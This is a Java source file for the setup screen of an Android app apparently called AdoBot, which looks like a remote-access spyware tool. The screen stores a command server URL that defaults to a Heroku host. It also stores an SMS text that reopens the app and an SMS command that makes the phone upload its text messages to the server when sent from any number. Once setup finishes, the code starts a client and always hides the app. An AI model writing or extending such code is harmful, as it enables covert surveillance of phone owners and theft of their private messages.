package com.android.adobot.activities;

import android.content.Context;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.android.adobot.BuildConfig;
import com.android.adobot.AdobotConstants;
import com.android.adobot.R;

/**
 * Created by adones on 2/26/17.
 */

public class SetupActivity extends BaseActivity {

    private static final String TAG = "SetupActivity";

    SharedPreferences prefs;
    EditText editTextUrl, uploadSmsCommand, smsOpenText;
    String url, sms, uploadSMScmd;
    Button btnSetUrl;
    AppCompatActivity activity;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activity = this;
        setContentView(R.layout.activity_setup);
        prefs = this.getSharedPreferences("com.android.adobot", Context.MODE_PRIVATE);
        url = prefs.getString(AdobotConstants.PREF_SERVER_URL_FIELD, "https://adobot.herokuapp.com");
        sms = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
        uploadSMScmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");

        editTextUrl = (EditText) findViewById(R.id.edit_text_server_url);
        smsOpenText = (EditText) findViewById(R.id.sms_open_text);
        uploadSmsCommand = (EditText) findViewById(R.id.submit_sms_command);

        editTextUrl.setText(url);
        smsOpenText.setText(sms);
        uploadSmsCommand.setText(uploadSMScmd);

        TextView instruction = (TextView) findViewById(R.id.text_instruction);
        instruction.setText("Server URL");


        TextView sms_instruct = (TextView) findViewById(R.id.sms_open_text_instruction);
        sms_instruct.setText("Open by SMS");
        TextView smsupload = (TextView) findViewById(R.id.submit_sms_instruction);
        smsupload.setText("Upload SMS Command");

        btnSetUrl = (Button) findViewById(R.id.btn_save_settings);
        btnSetUrl.setOnClickListener(saveBtnClickListener);
    }

    private View.OnClickListener saveBtnClickListener = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            url = editTextUrl.getText().toString();
            sms = smsOpenText.getText().toString();
            uploadSMScmd = uploadSmsCommand.getText().toString();
            String reviewText = "Confirm your server address: \n\n" + url;
            new AlertDialog.Builder(activity)
                    .setTitle("Server Setup")
                    .setMessage(reviewText)
                    .setIcon(android.R.drawable.ic_dialog_alert)
                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {

                        public void onClick(DialogInterface dialog, int whichButton) {
                            setServerUrl(url);
//                            Toast.makeText(SetupActivity.this, "AdoBot server set to: \n" + url, Toast.LENGTH_LONG).show();

                            String title = "Open app by SMS";
                            new AlertDialog.Builder(activity)
                                    .setTitle(title)
                                    .setMessage("Open Adobot by sending \""+ sms +"\" to any mobile number.")
                                    .setIcon(android.R.drawable.ic_dialog_alert)
                                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {

                                        public void onClick(DialogInterface dialog, int whichButton) {
                                            setSms(sms);
//                                            Toast.makeText(SetupActivity.this, "Open the app by sending this SMS to any number: \n" + sms, Toast.LENGTH_LONG).show();

                                            String title = "Upload SMS Command";
                                            new AlertDialog.Builder(activity)
                                                    .setTitle(title)
                                                    .setMessage("Force submit SMS's to server by receiving \""+ uploadSMScmd +"\" from any mobile number.")
                                                    .setIcon(android.R.drawable.ic_dialog_alert)
                                                    .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {

                                                        public void onClick(DialogInterface dialog, int whichButton) {
                                                            setUploadSmsCommand(uploadSMScmd);
//                                                            Toast.makeText(SetupActivity.this, "Upload SMS's by receiving this SMS from any number: \n" + uploadSMScmd, Toast.LENGTH_LONG).show();
                                                        }
                                                    })
                                                    .setNegativeButton(android.R.string.no, null).show();
                                        }
                                    })
                                    .setNegativeButton(android.R.string.no, null).show();

                        }
                    })
                    .setNegativeButton(android.R.string.no, null).show();
        }
    };

    private void setServerUrl(String url) {
        prefs.edit().putString(AdobotConstants.PREF_SERVER_URL_FIELD, url).commit();
    }

    private void setSms(String sms) {
        prefs.edit().putString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, sms.trim()).commit();
    }

    private void setUploadSmsCommand(String str) {
        prefs.edit().putString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, str).commit();
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            done();
        }
    }

    private void done() {
        startClient();
//        if (!BuildConfig.DEBUG) hideApp();
        hideApp();
        finish();
    }
}
